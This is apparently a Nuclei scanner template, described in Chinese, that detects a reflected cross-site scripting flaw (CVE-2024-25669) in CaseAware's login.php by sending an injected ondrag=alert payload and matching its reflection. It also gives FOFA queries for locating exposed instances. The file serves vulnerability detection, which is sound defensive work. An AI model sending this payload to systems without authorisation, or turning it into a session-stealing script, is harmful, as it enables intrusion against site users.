id: caseaware-xss

info:
  name: CaseAware a360inc - 跨站脚本漏洞（CVE-2024-25669）
  author: r3naissance
  severity: medium
  description: |
    该模板用于检测 CaseAware a360inc - 跨站脚本漏洞（CVE-2024-25669）。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p` 等路径发送探测请求，并根据响应中的 `value='test' draggable=true ondrag=alert(document.domain)`、`CaseAware` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-25669
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-score: 0.00286
    epss-percentile: 0.65504
    cpe: cpe:2.3:a:a360inc:caseaware:-:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: a360inc
    product: caseaware
    fofa-query:
      - title="CaseAware"
      - title="caseaware"
  tags: xss,caseaware,a360inc,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "value='test' draggable=true ondrag=alert(document.domain)"
          - "CaseAware"
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
